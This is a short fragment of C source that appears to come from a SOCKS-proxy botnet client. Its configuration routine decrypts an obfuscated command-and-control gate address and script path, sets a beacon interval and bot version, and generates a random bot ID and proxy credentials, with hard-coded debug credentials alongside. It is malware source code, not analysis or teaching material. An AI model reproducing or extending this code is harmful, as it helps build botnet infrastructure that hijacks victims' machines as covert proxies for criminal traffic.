BOOL InitConfig()
{
	BOOL bRet = TRUE;
#ifdef _DEBUG_
	Global.dwGateIp				= api.pinet_addr(DeCrypt(CONFIG_IP_SERVER));	// 192.168.1.2"
#else
	Global.dwGateIp				= api.pinet_addr(DeCrypt(CONFIG_IP_SERVER)); // for home vmware debug
#endif
	Global.dwPortRangeStart		= CONFIG_PORT_RANGE_START;
	Global.dwPortRangeEnd		= CONFIG_PORT_RANGE_END;
	Global.dwBotVersion			= 1;
#ifdef _DEBUG_
	Global.dwSleepTime			= (10000*6)*1;// 1 minute
#else
	Global.dwSleepTime			= (10000*6)*10;
#endif
	Global.dwMaxLoopBufferLen	= 1500;
	Global.dwMaxUsers			= 256;
	Global.usPort				= 80;
	
	// Заебался переключать логины и пароли
#ifdef _DEBUG_
	strcpy(pGlobOpt->szLogin,"p1mp"); 
	strcpy(pGlobOpt->szPassw,"p1mp"); 
	strcpy(pGlobOpt->szBotId,"debug_id"); 
#else
	GetRandomStr(10,0x61,0x70,(char *)&pGlobOpt->szLogin);
	GetRandomStr(10,0x61,0x70,(char *)&pGlobOpt->szPassw);
	GetRandomStr(10,0x30,0x39,(char *)&pGlobOpt->szBotId);
#endif

	memset(&pGlobOpt->szGateUrl,0,500);
	strcpy((char *)&pGlobOpt->szGateUrl,DeCrypt(CONFIG_PATH_TO_SCRIPT));


	if(!pUserInfo)
	{
		pUserInfo = ALLOC(sizeof(SOCKS_USER_INFO));
		if(pUserInfo)
		{
			botOpt.pUserInfo = pUserInfo;
			if(!SocksInitUserInfo(pUserInfo,&botOpt))
			{
				bRet = FALSE;
				goto end;
			}
		}
	}

	if(api.pWSAStartup(0x02,&WSAData) != 0)
		bRet = FALSE;
end:
	return bRet;
}